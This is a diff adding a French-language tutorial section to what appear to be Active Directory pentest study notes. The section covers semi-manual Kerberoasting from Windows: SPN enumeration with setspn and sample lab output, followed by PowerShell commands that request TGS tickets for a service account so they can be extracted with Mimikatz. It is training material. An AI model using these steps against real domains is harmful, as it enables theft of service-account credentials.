@@ -2559,6 +2559,81 @@ Il est essentiel de faire ces distinctions dans nos rapports et de savoir quand 
 
 Les attaques de **Kerberoasting** sont désormais facilement réalisées à l'aide d'outils et de scripts automatisés. Nous allons aborder la réalisation de cette attaque de différentes manières, à la fois depuis un hôte Linux et un hôte Windows attaqué. Commençons par expliquer comment procéder depuis un hôte Linux. La section suivante détaillera une méthode "semi-manuelle" pour réaliser l'attaque, ainsi que deux attaques rapides et automatisées utilisant des outils open-source courants, le tout depuis un hôte Windows attaqué.
 
+### Kerberoasting from Windows
+
+#### Méthode semi-manuelle de Kerberoasting
+
+Avant l'existence d'outils comme Rubeus, le vol ou la falsification de tickets Kerberos était un processus complexe et manuel. Au fur et à mesure que les tactiques et les défenses ont évolué, il est désormais possible de réaliser un Kerberoasting à partir de Windows de plusieurs manières. Nous allons commencer par explorer la méthode manuelle, puis passer à des outils plus automatisés. Commençons par utiliser l'outil intégré `setspn` pour énumérer les SPN (Service Principal Names) dans le domaine.
+
+###### Énumération des SPN avec setspn.exe
+
+####### Kerberoasting - depuis Windows
+
+```bash
+C:\htb> setspn.exe -Q */*
+```
+
+Cela permet d'énumérer les SPN dans le domaine spécifié. L'outil retourne plusieurs SPN associés à différents comptes et services dans le domaine. Nous nous concentrerons sur les comptes utilisateurs et ignorerons les comptes d'ordinateurs retournés par l'outil.
+
+####### Exemple de sortie
+
+```
+Vérification du domaine DC=INLANEFREIGHT,DC=LOCAL
+CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
+        exchangeAB/ACADEMY-EA-DC01
+        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+        TERMSRV/ACADEMY-EA-DC01
+        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
+        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
+
+<SNIP>
+
+CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        backupjob/veam001.inlanefreight.local
+CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        sts/inlanefreight.local
+
+<SNIP>
+
+CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/SPSJDB.inlanefreight.local:1433
+CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
+CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        adfsconnect/azure01.inlanefreight.local
+```
+
+Nous pouvons voir plusieurs SPN retournés pour différents hôtes dans le domaine. Nous nous concentrerons sur les comptes utilisateurs et ignorerons les comptes d'ordinateurs retournés par l'outil.
+
+##### Cibler un utilisateur spécifique
+
+Une fois les SPN énumérés, nous pouvons utiliser PowerShell pour demander des tickets TGS (Ticket Granting Service) pour un compte spécifique et les charger en mémoire. Ensuite, nous pouvons extraire ces tickets en utilisant Mimikatz. Voici un exemple pour cibler un utilisateur spécifique :
+
+###### Exemple PowerShell
+
+```powershell
+PS C:\htb> Add-Type -AssemblyName System.IdentityModel
+PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+####### Explication des commandes
+
+1. **Add-Type** : Cette commande ajoute une classe du framework .NET à notre session PowerShell, ce qui permet de l'instancier comme n'importe quel objet du framework .NET.
+2. **-AssemblyName** : Ce paramètre permet de spécifier l'assemblée contenant les types que nous souhaitons utiliser.
+3. **System.IdentityModel** : Il s'agit d'un espace de noms contenant des classes pour créer des services de jetons de sécurité.
+4. **New-Object** : Utilisé pour créer une instance d'un objet du framework .NET.
+5. **KerberosRequestorSecurityToken** : Cette classe est utilisée pour créer un jeton de sécurité Kerberos et demander un ticket TGS pour le compte cible.
+
+Nous pouvons également choisir de récupérer tous les tickets avec cette méthode, mais cela inclurait également les comptes d'ordinateurs, ce qui n'est pas optimal.
+
+#### Résumé
+
+La méthode semi-manuelle de Kerberoasting consiste à énumérer les SPN dans un domaine, puis à cibler un utilisateur spécifique pour obtenir des tickets TGS via PowerShell. Ces tickets peuvent ensuite être extraits avec Mimikatz. Cette méthode est la base de ce qui est automatisé par des outils comme Rubeus, mais elle reste utile pour comprendre le fonctionnement de Kerberoasting à un niveau plus fondamental.
+
 
 
 
